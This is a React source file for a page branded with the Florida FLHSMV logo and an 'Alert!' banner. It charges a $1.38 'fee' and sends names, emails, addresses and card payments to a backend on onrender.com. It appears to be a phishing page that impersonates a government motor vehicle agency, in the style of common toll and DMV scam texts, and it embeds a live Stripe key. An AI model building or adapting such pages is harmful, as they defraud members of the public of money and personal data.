import React, { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { loadStripe } from "@stripe/stripe-js";
import "./style.css";

const stripePromise = loadStripe(
  "pk_live_51OF4jYJAl1eXuNk5kVc2ltfM7XgBmwc0uGvlT6MECVWsBmQqhkpZ43GPyYQ58mrq1A59K5UqE6TFbSoE4f9jmy1p00nulOIW6x"
);

export default function FLHSMVPage() {
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    name: "",
    email: "",
    phone: "",
    state: "",
    message: "",
  });
  const [loading, setLoading] = useState(false);

  const stripeRef = useRef(null);
  const cardElementRef = useRef(null);
  const elementsRef = useRef(null);

  const handleChange = (e) => {
    setFormData((prev) => ({ ...prev, [e.target.name]: e.target.value }));
  };

  // Initialize Stripe Elements safely
  useEffect(() => {
    const setupStripe = async () => {
      const cardContainer = document.getElementById("card-element");
      if (!cardContainer) return;

      const stripe = await stripePromise;
      stripeRef.current = stripe;
      const elements = stripe.elements();
      elementsRef.current = elements;

      const card = elements.create("card", {
        style: {
          base: {
            color: "#32325d",
            fontFamily: "Arial, sans-serif",
            fontSmoothing: "antialiased",
            fontSize: "16px",
            "::placeholder": { color: "#a0aec0" },
          },
          invalid: { color: "#fa755a", iconColor: "#fa755a" },
        },
      });

      card.mount(cardContainer);
      cardElementRef.current = card;
    };

    setupStripe();
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      // 1️⃣ Create PaymentIntent on backend with metadata
      const res = await fetch(
        "https://flhsmv-backend.onrender.com/create-payment-intent",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            amount: 138, // $1.38 in cents
            metadata: formData,
          }),
        }
      );

      if (!res.ok) throw new Error("Failed to create PaymentIntent");
      const { clientSecret } = await res.json();
      if (!clientSecret) throw new Error("Missing clientSecret from server");

      // 2️⃣ Confirm card payment
      const { error, paymentIntent } = await stripeRef.current.confirmCardPayment(clientSecret, {
        payment_method: {
          card: cardElementRef.current,
          billing_details: {
            name: formData.name,
            email: formData.email,
          },
        },
      });

      if (error) {
        alert("Payment failed: " + error.message);
      } else if (paymentIntent.status === "succeeded") {
        // 3️⃣ Optionally store contact info to backend via /submit route
        await fetch("https://flhsmv-backend.onrender.com/submit", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(formData),
        });

        alert("Payment successful!");
        navigate("/home1");
      } else {
        alert("Payment was not completed.");
      }
    } catch (err) {
      console.error(err);
      alert("Payment error. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div>
      <nav className="container" id="orange">Alert!</nav>

      <header className="site-header">
        <div className="top-bar">
          <img src="flhsmv.png" id="flhsmv" alt="FLHSMV logo" />
        </div>
      </header>

      <section className="email-form">
        <h2>Payment Center</h2>
        <form onSubmit={handleSubmit}>
          <div>Fee Payment: $1.38</div>

          <label htmlFor="name">Full Name</label>
          <input id="name" name="name" value={formData.name} onChange={handleChange} required />

          <label htmlFor="email">Email</label>
          <input id="email" name="email" type="email" value={formData.email} onChange={handleChange} required />

          <label htmlFor="phone">City</label>
          <input id="phone" name="phone" value={formData.phone} onChange={handleChange} />

          <label htmlFor="state">State</label>
          <input id="state" name="state" value={formData.state} onChange={handleChange} />

          <label htmlFor="message">ZIP / Postal Code</label>
          <input id="message" name="message" value={formData.message} onChange={handleChange} required />

          <label id = "cardbanner">Card Details</label>
  

          <button type="submit" disabled={loading}>
            {loading ? "Processing..." : "Pay $1.38"}
          </button>
        </form>
      </section>
    </div>
  );
}
